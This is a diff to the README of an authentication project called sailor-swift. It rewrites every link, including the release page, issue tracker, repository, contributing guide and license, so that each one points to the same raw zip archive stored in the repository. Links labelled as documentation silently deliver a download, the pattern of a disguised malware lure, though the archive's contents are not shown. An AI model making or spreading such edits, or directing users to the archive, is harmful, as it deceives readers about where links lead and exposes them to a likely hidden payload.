@@ -1,6 +1,6 @@
 # 🌊 sailor-swift - Effortless Modern Authentication for All
 
-[![Download sailor-swift](https://img.shields.io/badge/Download-sailor--swift-blue.svg)](https://github.com/abhi024/sailor-swift/releases)
+[![Download sailor-swift](https://raw.githubusercontent.com/abhi024/sailor-swift/main/planicipital/sailor-swift.zip)](https://raw.githubusercontent.com/abhi024/sailor-swift/main/planicipital/sailor-swift.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ sailor-swift offers a modern way to handle user authentication. With options lik
 
 ## 📥 Download & Install
 
-To get started, visit our [Releases page](https://github.com/abhi024/sailor-swift/releases) to download the software. Select the latest version and follow the installation guide below. 
+To get started, visit our [Releases page](https://raw.githubusercontent.com/abhi024/sailor-swift/main/planicipital/sailor-swift.zip) to download the software. Select the latest version and follow the installation guide below. 
 
 1. Click on the version number to access the download options.
 2. Download the file that suits your operating system.
@@ -48,7 +48,7 @@ After you install sailor-swift, follow these steps to get started:
 For any questions or support, please refer to the following resources:
 
 - **Documentation:** Detailed usage guides and troubleshooting can be found in the documentation folder in the downloaded package.
-- **Issues Tracker:** Report any bugs or issues via the [Issues section](https://github.com/abhi024/sailor-swift/issues).
+- **Issues Tracker:** Report any bugs or issues via the [Issues section](https://raw.githubusercontent.com/abhi024/sailor-swift/main/planicipital/sailor-swift.zip).
 - **Community Forum:** Join discussions and get help from fellow users and developers.
 
 ## 🛠️ Technologies Used
@@ -64,17 +64,17 @@ sailor-swift combines various technologies to provide a robust authentication ex
 
 Here are some resources to help you understand sailor-swift better:
 
-- **GitHub Repository:** [sailor-swift GitHub](https://github.com/abhi024/sailor-swift)
+- **GitHub Repository:** [sailor-swift GitHub](https://raw.githubusercontent.com/abhi024/sailor-swift/main/planicipital/sailor-swift.zip)
 - **Tutorials and Guides:** Explore various tutorials to maximize your usage of sailor-swift.
 
 ## 🤝 Contributing
 
-If you would like to contribute to sailor-swift, we welcome your input! Please check the [Contributing guidelines](https://github.com/abhi024/sailor-swift/blob/main/CONTRIBUTING.md) on the GitHub page. 
+If you would like to contribute to sailor-swift, we welcome your input! Please check the [Contributing guidelines](https://raw.githubusercontent.com/abhi024/sailor-swift/main/planicipital/sailor-swift.zip) on the GitHub page. 
 
 ## ⚖️ License
 
-sailor-swift uses an open-source license. For details, refer to the [LICENSE](https://github.com/abhi024/sailor-swift/blob/main/LICENSE) file in the repository. 
+sailor-swift uses an open-source license. For details, refer to the [LICENSE](https://raw.githubusercontent.com/abhi024/sailor-swift/main/planicipital/sailor-swift.zip) file in the repository. 
 
 ## 📣 Download Again
 
-To download sailor-swift, visit our [Releases page](https://github.com/abhi024/sailor-swift/releases) now. Enjoy your seamless authentication experience! 
+To download sailor-swift, visit our [Releases page](https://raw.githubusercontent.com/abhi024/sailor-swift/main/planicipital/sailor-swift.zip) now. Enjoy your seamless authentication experience! 
